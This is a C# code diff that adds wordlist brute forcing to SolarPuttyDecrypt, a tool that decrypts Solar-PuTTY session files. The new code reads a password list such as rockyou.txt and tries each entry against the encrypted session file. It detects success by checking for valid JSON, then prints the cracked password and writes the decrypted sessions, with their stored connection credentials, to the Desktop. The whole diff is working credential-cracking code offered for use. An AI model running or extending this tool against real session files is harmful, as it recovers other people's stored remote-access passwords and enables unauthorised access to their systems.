@@ -11,85 +11,110 @@ namespace SolarPuttyDecrypt
     {
         static void Main(string[] args)
         {
-            if (args.Length == 0 || args==null)
+            if (args.Length == 0 || args == null)
             {
                 Console.ForegroundColor = ConsoleColor.Cyan;
-                Console.WriteLine("SolarPuttyDecrypt now will try to dump local sessions' file, otherwise enter SolarPutty's sessions file path and password.");
-                Console.WriteLine("\nUsage: SolarPuttyDecrypt.exe C:\\session.dat pwd123 (use \"\" for empty password)");
+                Console.WriteLine("SolarPuttyDecrypt will attempt to dump the local session's file, otherwise enter the path to the SolarPutty session file and the path to the password list.");
+                Console.WriteLine("\nUsage: SolarPuttyDecrypt.exe C:\\session.dat C:\\rockyou.txt");
                 Console.ResetColor();
-                //Environment.Exit(1);
+                return;
             }
+
             string CurrDir = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
             Console.WriteLine("-----------------------------------------------------");
             Console.ForegroundColor = ConsoleColor.Green;
-            Console.WriteLine("SolarPutty's Sessions Decrypter by VoidSec");
+            Console.WriteLine("SolarPutty's Sessions Decrypter by VoidSec (Brute-Force by pointedsec)");
             Console.ResetColor();
             Console.WriteLine("-----------------------------------------------------");
             Console.ForegroundColor = ConsoleColor.Yellow;
-            if(args.Length == 0 || args == null)
+
+            if (args.Length == 2)
             {
-                string ExportedDirectoryPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SolarWinds\\FreeTools\\Solar-PuTTY\\");
-                string sessionfile = Path.Combine(ExportedDirectoryPath, "data.dat");
-                DoImport(sessionfile, null, CurrDir);
+                string sessionfile = args[0];
+                string passwordFile = args[1];
+                TestPasswords(sessionfile, passwordFile, CurrDir);
             }
-            else
-            {
-                DoImport(args[0], args[1], CurrDir);
-            }
+
             Console.ResetColor();
             Console.WriteLine("-----------------------------------------------------");
             Console.ForegroundColor = ConsoleColor.Green;
             Console.WriteLine("[+] DONE Decrypted file is saved in: " + CurrDir + "\\SolarPutty_sessions_decrypted.txt");
             Console.ResetColor();
         }
-        static void DoImport(string dialogFileName, string password, string CurrDir)
+
+        static void TestPasswords(string sessionFile, string passwordFile, string CurrDir)
+        {
+            string[] passwords = File.ReadAllLines(passwordFile);
+
+            foreach (string password in passwords)
+            {
+                Console.WriteLine($"Trying password: {password}");
+                try
+                {
+                    string decryptedText = DoImport(sessionFile, password, CurrDir);
+                    if (IsValidJson(decryptedText))
+                    {
+                        Console.ForegroundColor = ConsoleColor.Green;
+                        Console.WriteLine($"[+] Password found: {password}");
+                        break;  // Salir del bucle cuando se encuentre la contraseña correcta
+                    }
+                    else
+                    {
+                        Console.ForegroundColor = ConsoleColor.Red;
+                        Console.WriteLine("Error de desencriptación: Datos incorrectos o formato no válido.");
+                        Console.ResetColor();
+                    }
+                }
+                catch (CryptographicException)
+                {
+                    Console.ForegroundColor = ConsoleColor.Red;
+                    Console.WriteLine("Error de desencriptación: Datos incorrectos.");
+                    Console.ResetColor();
+                }
+            }
+        }
+
+        static string DoImport(string dialogFileName, string password, string CurrDir)
         {
             using (FileStream fileStream = new FileStream(dialogFileName, FileMode.Open))
             {
                 using (StreamReader streamReader = new StreamReader(fileStream))
                 {
                     string text = streamReader.ReadToEnd();
-                    try
+                    string decryptedText = Crypto.Decrypt(password, text);
+                    if (decryptedText == null)
                     {
-                        var text2 = (password == null) ? Crypto.Deob(text) : Crypto.Decrypt(password, text);
-                        if (text2 == null)
-                        {
-                            return;
-                        }
-                        var obj = JsonConvert.DeserializeObject(text2);
-                        var f = JsonConvert.SerializeObject(obj, Formatting.Indented);
-                        Console.WriteLine("\n"+f+"\n");
-                        using (StreamWriter outputFile = new StreamWriter(Path.Combine(CurrDir, "SolarPutty_sessions_decrypted.txt")))
-                        outputFile.WriteLine(f);
+                        throw new CryptographicException("Datos incorrectos.");
                     }
-                    catch (CryptographicException ex)
-                    {
-                        if (ex.Message == "Padding is invalid and cannot be removed.")
-                        {
-                            Console.ForegroundColor = ConsoleColor.Red;
-                            Console.WriteLine("User entered wrong password for import");
-                            Console.ResetColor();
-                            Environment.Exit(1);
-                        }
-                        else
-                        {
-                            Console.ForegroundColor = ConsoleColor.Red;
-                            Console.WriteLine(ex);
-                            Console.ResetColor();
-                            Environment.Exit(1);
-                        }
-                        fileStream.Close();
-                    }
-                    catch (FormatException message)
-                    {
-                        Console.ForegroundColor = ConsoleColor.Red;
-                        Console.WriteLine(message);
-                        Console.ResetColor();
-                        fileStream.Close();
-                        Environment.Exit(1);
-                    }
+
+                    // Guardar el resultado descifrado solo si es válido
+                    File.WriteAllText(Path.Combine(CurrDir, "SolarPutty_sessions_decrypted.txt"), decryptedText);
+                    return decryptedText;
                 }
-            }            
+            }
+        }
+
+        static bool IsValidJson(string strInput)
+        {
+            strInput = strInput.Trim();
+            if ((strInput.StartsWith("{") && strInput.EndsWith("}")) || // Objeto JSON
+                (strInput.StartsWith("[") && strInput.EndsWith("]")))   // Array JSON
+            {
+                try
+                {
+                    var obj = JsonConvert.DeserializeObject(strInput);
+                    return true;
+                }
+                catch (JsonReaderException)
+                {
+                    return false;
+                }
+                catch (Exception)
+                {
+                    return false;
+                }
+            }
+            return false;
         }
     }
 }
@@ -117,8 +142,6 @@ internal class Crypto
                         {
                             byte[] array3 = new byte[array2.Length];
                             int count = cryptoStream.Read(array3, 0, array3.Length);
-                            memoryStream.Close();
-                            cryptoStream.Close();
                             return Encoding.UTF8.GetString(array3, 0, count);
                         }
                     }
@@ -140,8 +163,7 @@ internal class Crypto
             Console.ForegroundColor = ConsoleColor.Red;
             Console.WriteLine(message);
             Console.ResetColor();
-            Environment.Exit(1);
+            return string.Empty;
         }
-        return string.Empty;
     }
 }
